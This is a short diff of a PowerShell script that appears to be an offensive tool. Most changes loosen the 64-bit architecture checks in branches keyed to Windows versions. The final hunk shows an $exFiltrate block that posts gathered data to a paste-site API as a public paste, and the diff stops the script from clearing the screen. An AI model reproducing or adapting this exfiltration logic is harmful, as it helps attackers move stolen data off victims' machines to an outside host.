@@ -185,7 +185,7 @@ else {
     }
     else {
         if($operatingSystem -eq "6.1.7601" -or $operatingSystem -eq "6.1.7600"){
-            if($osArchitecture -eq "64 bits" -or $osArchitecture -eq "64-bit") {
+            if($osArchitecture -like "64*") {
                 $mode = 1
             }
             else {
@@ -198,7 +198,7 @@ else {
             }
             else{
                 if($operatingSystem -eq "6.3.9600" -or $operatingSystem -eq "10.0.10240" -or $operatingSystem -eq "10.0.10514"){        
-                    if($osArchitecture -eq "64 bits" -or $osArchitecture -eq "64-bit") {                
+                    if($osArchitecture -like "64*") {                
                         $mode = "2r2"
                     }
                     else {
@@ -347,4 +347,4 @@ if($exFiltrate -eq 1 -and ![string]::IsNullOrEmpty($dev_key)) {
     $parameters = "&api_option=paste&api_dev_key=$dev_key&api_paste_name=$pasteName&api_paste_code=$pasteValue&api_paste_private=0" 
     Post-HttpRequest $url $parameters
 }
-cls
+#cls
